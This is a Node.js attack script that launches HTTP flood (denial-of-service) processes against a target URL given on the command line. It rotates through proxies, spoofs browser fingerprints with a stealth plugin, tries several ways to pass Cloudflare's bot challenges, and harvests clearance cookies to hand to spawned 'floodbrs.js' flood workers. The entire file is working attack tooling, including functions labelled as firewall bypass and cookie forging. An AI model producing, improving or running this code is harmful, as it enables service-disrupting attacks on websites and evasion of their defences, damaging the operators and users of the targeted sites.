const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    PINK: '\x1b[35m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    RESET: '\x1b[0m'
};

// ========== CLOUDFLARE BYPASS ==========
const bypassFirewall = async (page) => {
    await page.evaluateOnNewDocument(() => {
        Object.defineProperty(navigator, 'webdriver', { get: () => false });
        Object.defineProperty(navigator, 'plugins', { 
            get: () => [
                {0: {type: "application/x-google-chrome-pdf"}, name: "Chrome PDF Plugin", filename: "internal-pdf-viewer", description: "Portable Document Format"},
                {0: {type: "application/pdf"}, name: "Chrome PDF Viewer", filename: "mhjfbmdgcfjbbpaeojofohoefgiehjai", description: "Portable Document Format"}
            ] 
        });
        Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'] });
        
        window.chrome = { 
            runtime: {
                connect: () => ({onMessage: {addListener: () => {}}, postMessage: () => {}, onDisconnect: {addListener: () => {}}}),
                sendMessage: () => {},
                onMessage: {addListener: () => {}},
                onConnect: {addListener: () => {}},
                getManifest: () => ({}),
                id: 'testid'
            }, 
            loadTimes: () => ({
                finishDocumentLoadTime: 0,
                finishLoadTime: 0,
                firstPaintTime: 0,
                requestTime: 0,
                startLoadTime: 0,
                commitLoadTime: 0
            }), 
            csi: () => ({onloadT: Date.now(), startE: Date.now() - 1000, pageT: 1200}), 
            app: {
                isInstalled: false,
                InstallState: {DISABLED: 'disabled', INSTALLED: 'installed', NOT_INSTALLED: 'not_installed'},
                RunningState: {CANNOT_RUN: 'cannot_run', READY_TO_RUN: 'ready_to_run', RUNNING: 'running'}
            }
        };
        
        const originalQuery = window.navigator.permissions.query;
        window.navigator.permissions.query = (parameters) => (
            parameters.name === 'notifications' ?
                Promise.resolve({ state: Notification.permission }) :
                originalQuery(parameters)
        );

        Object.defineProperty(navigator, 'hardwareConcurrency', { value: 8 });
        Object.defineProperty(navigator, 'deviceMemory', { value: 8 });
        Object.defineProperty(navigator, 'maxTouchPoints', { value: 5 });
        
        Object.defineProperty(document, 'hidden', { value: false });
        Object.defineProperty(document, 'visibilityState', { value: 'visible' });
        
        delete window.__webdriver_evaluate;
        delete window.__selenium_evaluate;
        delete window.__webdriver_script_function;
        delete window.__webdriver_script_func;
        delete window.__webdriver_script_fn;
        delete window._Selenium_IDE_Recorder;
        delete window._selenium;
        delete window.callPhantom;
        delete window.callSelenium;
        delete window.phantom;
        delete window.webdriver;
        delete window.selenium;
        delete window._phantom;
    });
};

const getFirewallBypassArgs = (proxy = '') => {
    const args = [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--disable-blink-features=AutomationControlled',
        '--disable-infobars',
        '--no-zygote',
        '--single-process',
        '--disable-background-timer-throttling',
        '--disable-renderer-backgrounding',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--ignore-certificate-errors',
        '--ignore-ssl-errors',
        '--disable-web-security',
        '--disable-features=site-per-process',
        '--disable-ipc-flooding-protection',
        '--disable-backgrounding-occluded-windows',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-translate',
        '--disable-xss-auditor',
        '--no-pings',
        '--use-gl=swiftshader',
        '--disable-software-rasterizer',
        '--no-default-browser-check',
        '--disable-background-networking',
        '--disable-client-side-phishing-detection',
        '--disable-sync',
        '--disable-hang-monitor',
        '--disable-prompt-on-repost',
        '--disable-domain-reliability',
        '--disable-component-update',
        '--aggressive-cache-discard',
        '--max_old_space_size=4096'
    ];

    // Tambahkan proxy jika ada
    if (proxy) {
        args.push(`--proxy-server=${proxy}`);
    }

    return args;
};

// CLOUDFLARE COOKIES GENERATOR
const generateCloudflareCookies = () => {
    const timestamp = Date.now();
    
    const cookies = {
        '__cf_bm': `${generateRandomString(50, 60)}.${timestamp}.0.0.0.0`,
        '__cflb': generateRandomString(20, 30),
        '__cf_chl_rt_tk': `${generateRandomString(10, 15)}.${timestamp}.0.0.${Math.random().toString(36).substring(2, 15)}`,
        'cf_clearance': `${generateRandomString(40, 50)}.${timestamp}.0.0.${Math.random().toString(36).substring(2, 15)}`,
        '__cfruid': generateRandomString(20, 30),
        '__cf_chl_tk': generateRandomString(30, 40),
        '__cf_chl_entered_rc': '1',
        '__cf_chl_captcha_tk': generateRandomString(20, 30),
        '__cf_chl_fid': generateRandomString(20, 30),
        '__cf_chl_seq': Math.floor(Math.random() * 1000).toString(),
        '__cf_chl_opt': '1',
        '__cf_chl_js_verify': generateRandomString(10, 15),
        '__cf_chl_rc_i': '1'
    };
    
    return Object.entries(cookies)
        .map(([name, value]) => `${name}=${value}`)
        .join('; ');
};

// UNIVERSAL CLOUDFLARE CHALLENGE SOLVER
const solveCloudflareChallenge = async (page, browserProxy, targetURL) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting Cloudflare solver: ${maskProxy(browserProxy)}`);
        
        // Initial wait
        await sleep(5);
        
        let currentUrl = page.url();
        let title = await page.title().catch(() => '');
        let content = await page.content().catch(() => '');
        
        // Check if already passed
        const isPassed = !title.includes('Just a moment') && 
                        !title.includes('Checking your browser') &&
                        !title.includes('Verifikasi') &&
                        !title.includes('Verification') &&
                        !currentUrl.includes('challenges.cloudflare.com') &&
                        content.length > 1000;
        
        if (isPassed) {
            coloredLog(COLORS.GREEN, `[SOLVER] Already passed: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Cloudflare challenge detected: ${maskProxy(browserProxy)}`);
        
        // STRATEGY 1: Extended wait for auto-solve
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 1: Extended wait (15s)`);
        await sleep(15);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        content = await page.content().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Auto-solve successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'auto_solve' };
        }
        
        // STRATEGY 2: Universal button click untuk semua jenis challenge
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 2: Universal button interaction`);
        
        const buttonSelectors = [
            'input[type="button"]',
            'input[type="submit"]',
            'button',
            '.btn',
            '.button',
            '.cf-btn',
            '.hcaptcha-box',
            '.success-button',
            '.verify-btn',
            '[role="button"]',
            '[onclick*="submit"]',
            '[onclick*="verify"]',
            '[onclick*="check"]',
            '.big-button',
            '.primary-button',
            '.challenge-form input[type="submit"]',
            '.challenge-form button',
            'form button',
            'form input[type="submit"]'
        ];
        
        for (const selector of buttonSelectors) {
            try {
                const elements = await page.$$(selector);
                for (const element of elements) {
                    try {
                        const isVisible = await element.evaluate(el => {
                            const rect = el.getBoundingClientRect();
                            const style = window.getComputedStyle(el);
                            return rect.width > 0 && 
                                   rect.height > 0 && 
                                   style.visibility !== 'hidden' && 
                                   style.display !== 'none' &&
                                   style.opacity !== '0';
                        });
                        
                        if (isVisible) {
                            coloredLog(COLORS.YELLOW, `[SOLVER] Clicking visible element: ${selector}`);
                            await element.click().catch(() => {});
                            await sleep(8);
                            
                            // Check if solved
                            currentUrl = page.url();
                            title = await page.title().catch(() => '');
                            
                            if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
                                coloredLog(COLORS.GREEN, `[SOLVER] Button click successful: ${maskProxy(browserProxy)}`);
                                return { solved: true, scenario: 'button_click' };
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        
        // STRATEGY 3: JavaScript execution untuk trigger challenge completion
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 3: JavaScript execution`);
        
        try {
            await page.evaluate(() => {
                // Try to find and click any interactive elements
                const clickableSelectors = [
                    'input[type="submit"]',
                    'input[type="button"]', 
                    'button',
                    '.btn',
                    '.button',
                    '.cf-btn',
                    '.hcaptcha-box',
                    '[onclick]',
                    '[role="button"]',
                    '[role="checkbox"]'
                ];
                
                clickableSelectors.forEach(selector => {
                    const elements = document.querySelectorAll(selector);
                    elements.forEach(el => {
                        try {
                            if (el.offsetWidth > 0 && el.offsetHeight > 0) {
                                el.click();
                            }
                        } catch (e) {}
                    });
                });
                
                // Try to submit forms
                const forms = document.querySelectorAll('form');
                forms.forEach(form => {
                    try {
                        form.submit();
                    } catch (e) {}
                });
            });
            
            coloredLog(COLORS.YELLOW, `[SOLVER] Executed JavaScript interactions`);
            await sleep(8);
            
            // Check if solved
            currentUrl = page.url();
            title = await page.title().catch(() => '');
            
            if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
                coloredLog(COLORS.GREEN, `[SOLVER] JavaScript execution successful: ${maskProxy(browserProxy)}`);
                return { solved: true, scenario: 'javascript_execution' };
            }
        } catch (e) {
            coloredLog(COLORS.RED, `[SOLVER] JavaScript error: ${e.message}`);
        }
        
        // STRATEGY 4: Refresh and retry
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 4: Refresh and retry`);
        await page.reload().catch(() => {});
        await sleep(10);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Refresh successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'refresh_success' };
        }
        
        // STRATEGY 5: Direct navigation bypass
        coloredLog(COLORS.WHITE, `[SOLVER] Strategy 5: Direct navigation`);
        await page.goto(targetURL, { waitUntil: 'networkidle0', timeout: 30000 }).catch(() => {});
        await sleep(5);
        
        currentUrl = page.url();
        title = await page.title().catch(() => '');
        
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && !title.includes('Verifikasi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] Direct navigation successful: ${maskProxy(browserProxy)}`);
            return { solved: true, scenario: 'direct_navigation' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] All strategies failed: ${maskProxy(browserProxy)}`);
        return { solved: false, scenario: 'all_failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] Error: ${error.message}`);
        return { solved: false, scenario: 'error' };
    }
};

// COOKIES MANAGEMENT
const extractCookies = async (page, targetURL, browserProxy) => {
    try {
        coloredLog(COLORS.WHITE, `[COOKIES] Checking cookies: ${maskProxy(browserProxy)}`);
        
        await sleep(3);
        
        // Extract cookies dari semua domain
        let cookies = await page.cookies().catch(() => []);
        let cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        // Cek jika ada cookies yang relevan
        const hasRelevantCookies = cookieString.length > 10 && 
                                  (cookieString.includes('cf_') || 
                                   cookieString.includes('__cf') || 
                                   cookies.length > 2);
        
        if (hasRelevantCookies) {
            coloredLog(COLORS.GREEN, `[COOKIES] Found ${cookies.length} cookies: ${maskProxy(browserProxy)}`);
            
            const cookieNames = cookies.map(c => c.name).join(', ');
            coloredLog(COLORS.PINK, `[COOKIES] Cookie names: ${cookieNames}`);
            
            return { 
                success: true, 
                cookies: cookieString, 
                hasCookies: true,
                count: cookies.length 
            };
        } else {
            coloredLog(COLORS.YELLOW, `[COOKIES] No relevant cookies found: ${maskProxy(browserProxy)}`);
            return { 
                success: true, 
                cookies: '', 
                hasCookies: false,
                count: 0 
            };
        }
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] Extraction error: ${error.message}`);
        return { 
            success: false, 
            cookies: '', 
            hasCookies: false,
            count: 0 
        };
    }
};

// Command-line argument validation
if (process.argv.length < 6) {
    console.error('Usage: node browser.js <targetURL> <threads> <proxyFile> <rate> <time>');
    process.exit(1);
}

const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

let totalSolves = 0;
let currentProxyIndex = 0;

// Utility functions
const generateRandomString = (minLength, maxLength) => {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => 
        characters[Math.floor(Math.random() * characters.length)]
    ).join('');
};

const validKey = generateRandomString(5, 10);

const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        console.error('Error reading proxies file:', error.message);
        return [];
    }
};

const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    if (parts.length >= 2 && parts[0].split('.').length === 4) {
        const ipParts = parts[0].split('.');
        return `${ipParts[0]}.${ipParts[1]}.**.**:****`;
    }
    return proxy;
};

process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Nhận tín hiệu Ctrl+C, đang kill processes...');
    
    exec('taskkill /f /im node.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill node.exe: ${err.message}`);
        }
    });

    exec('taskkill /f /im msedge.exe', (err) => {
        if (err && err.code !== 128) {
            coloredLog(COLORS.RED, `[INFO] Lỗi kill msedge.exe: ${err.message}`);
        }
    });

    setTimeout(() => {
        process.exit(0);
    }, 3000);
});

const coloredLog = (color, text) => {
    console.log(`${color}${text}${COLORS.RESET}`);
};

const sleep = (seconds) => new Promise(resolve => setTimeout(resolve, seconds * 1000));

const randomElement = (array) => array[Math.floor(Math.random() * array.length)];

// User agents
const userAgents = [
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15`
];

// UNIVERSAL CLOUDFLARE BROWSER LAUNCHER DENGAN PROXY
const launchCloudflareBrowser = async (targetURL, browserProxy, attempt = 1, maxRetries = 2) => {
    const userAgent = randomElement(userAgents);
    let browser;

    const options = {
        headless: true,
        args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--window-size=1920,1080',
            `--user-agent=${userAgent}`,
            ...getFirewallBypassArgs(browserProxy) // Gunakan proxy di sini
        ],
        defaultViewport: {
            width: 1920,
            height: 1080,
            deviceScaleFactor: 1,
            isMobile: false,
            hasTouch: false,
            isLandscape: true
        },
        ignoreHTTPSErrors: true
    };

    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Starting with proxy: ${maskProxy(browserProxy)}`);
        browser = await puppeteer.launch(options);
        const [page] = await browser.pages();

        // Apply bypass
        await bypassFirewall(page);

        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'networkidle0',
            timeout: 45000 
        }).catch(() => {});

        // Solve Cloudflare challenge (semua jenis)
        const challengeResult = await solveCloudflareChallenge(page, browserProxy, targetURL);
        
        if (challengeResult.solved) {
            coloredLog(COLORS.GREEN, `[SUCCESS] Challenge solved via ${challengeResult.scenario}: ${maskProxy(browserProxy)}`);
        } else {
            coloredLog(COLORS.YELLOW, `[WARNING] Challenge not fully solved, but continuing: ${maskProxy(browserProxy)}`);
        }

        // Extract cookies dan cek apakah website membuat cookies
        const cookieResult = await extractCookies(page, targetURL, browserProxy);
        
        let finalCookies = '';
        if (cookieResult.success && cookieResult.hasCookies) {
            coloredLog(COLORS.GREEN, `[COOKIES] Using ${cookieResult.count} real cookies: ${maskProxy(browserProxy)}`);
            finalCookies = cookieResult.cookies;
        } else {
            coloredLog(COLORS.YELLOW, `[COOKIES] No cookies found, will attack without cookies: ${maskProxy(browserProxy)}`);
            finalCookies = '';
        }
        
        totalSolves++;
        coloredLog(COLORS.GREEN, `[STATS] Total successful: ${totalSolves}`);

        await browser.close();
        return { 
            cookies: finalCookies, 
            userAgent,
            scenario: challengeResult.scenario,
            hasCookies: cookieResult.hasCookies,
            cookieCount: cookieResult.count
        };
        
    } catch (error) {
        if (browser) await browser.close().catch(() => {});
        if (attempt < maxRetries) {
            coloredLog(COLORS.YELLOW, `[RETRY] Retrying... (${attempt}/${maxRetries}): ${maskProxy(browserProxy)}`);
            await sleep(3);
            return launchCloudflareBrowser(targetURL, browserProxy, attempt + 1, maxRetries);
        }
        coloredLog(COLORS.RED, `[FAILED] All attempts failed: ${maskProxy(browserProxy)}`);
        return null;
    }
};

// ========== FLOOD PROCESS LAUNCHER ==========
const launchFloodProcess = async (cookies, userAgent, browserProxy, hasCookies) => {
    try {
        coloredLog(COLORS.YELLOW, `[FLOOD] Launching flood with proxy: ${maskProxy(browserProxy)}`);
        
        const floodArgs = [
            'floodbrs.js',
            targetURL,
            duration.toString(),
            rate,
            '1', // threads untuk flood
            proxyFile, // file proxy asli
            cookies || '', // Gunakan cookies jika ada, kosong jika tidak
            userAgent || randomElement(userAgents),
            validKey
        ];

        coloredLog(COLORS.PINK, `[FLOOD] Mode: ${hasCookies ? 'WITH COOKIES' : 'NO COOKIES'}`);
        
        const floodProcess = spawn('node', floodArgs, {
            detached: true,
            stdio: 'ignore'
        });

        floodProcess.unref();
        return true;
        
    } catch (error) {
        coloredLog(COLORS.RED, `[FLOOD] Launch error: ${error.message}`);
        return false;
    }
};

// ========== SINGLE THREAD PROCESSOR ==========
const processNextProxy = async (proxies) => {
    if (currentProxyIndex >= proxies.length) {
        coloredLog(COLORS.YELLOW, '[INFO] All proxies processed, waiting for new proxies...');
        await sleep(10);
        currentProxyIndex = 0; // Restart dari awal
    }

    const browserProxy = proxies[currentProxyIndex];
    currentProxyIndex++;

    try {
        coloredLog(COLORS.WHITE, `[PROCESS] Processing proxy ${currentProxyIndex}/${proxies.length}: ${maskProxy(browserProxy)}`);
        
        const cloudflareData = await launchCloudflareBrowser(targetURL, browserProxy);
        
        if (cloudflareData) {
            // Launch flood process dengan data yang didapat
            const floodLaunched = await launchFloodProcess(
                cloudflareData.cookies, 
                cloudflareData.userAgent, 
                browserProxy,
                cloudflareData.hasCookies
            );
            
            if (floodLaunched) {
                coloredLog(COLORS.GREEN, `[SUCCESS] Flood launched ${cloudflareData.hasCookies ? 'with' : 'without'} cookies: ${maskProxy(browserProxy)}`);
            }
        } else {
            // Jika gagal, tetap launch flood tanpa data
            coloredLog(COLORS.YELLOW, `[FALLBACK] Launching flood without browser data: ${maskProxy(browserProxy)}`);
            
            const fallbackUserAgent = randomElement(userAgents);
            await launchFloodProcess('', fallbackUserAgent, browserProxy, false);
        }
        
    } catch (error) {
        coloredLog(COLORS.RED, `[PROCESS] Error: ${error.message}`);
    }

    // Lanjut ke proxy berikutnya setelah delay singkat
    await sleep(2);
    processNextProxy(proxies);
};

// ========== MAIN EXECUTION ==========
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        process.exit(1);
    }

    coloredLog(COLORS.GREEN, `[START] Single Thread Cloudflare Solver with ${proxies.length} proxies`);
    coloredLog(COLORS.WHITE, `[MODE] Continuous solving - 1 thread browser, multiple flood processes`);

    // Start single thread processor
    processNextProxy(proxies);

    // Auto-shutdown setelah duration
    setTimeout(() => {
        coloredLog(COLORS.YELLOW, '[CLEANUP] Time completed - cleaning up...');
        exec('pkill -f floodbrs.js', () => {});
        exec('pkill -f chrome', () => {});

        setTimeout(() => {
            coloredLog(COLORS.GREEN, '[SHUTDOWN] Mission complete');
            process.exit(0);
        }, 3000);
    }, duration * 1000);
};

process.on('uncaughtException', (error) => {
    coloredLog(COLORS.RED, `[CRASH] ${error.message}`);
});
process.on('unhandledRejection', (error) => {
    coloredLog(COLORS.RED, `[REJECTION] ${error.message}`);
});

coloredLog(COLORS.GREEN, '[READY] 🎯 SINGLE THREAD CLOUDFLARE SOLVER ACTIVATED 🎯');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${err.message}`);
    process.exit(1);
});
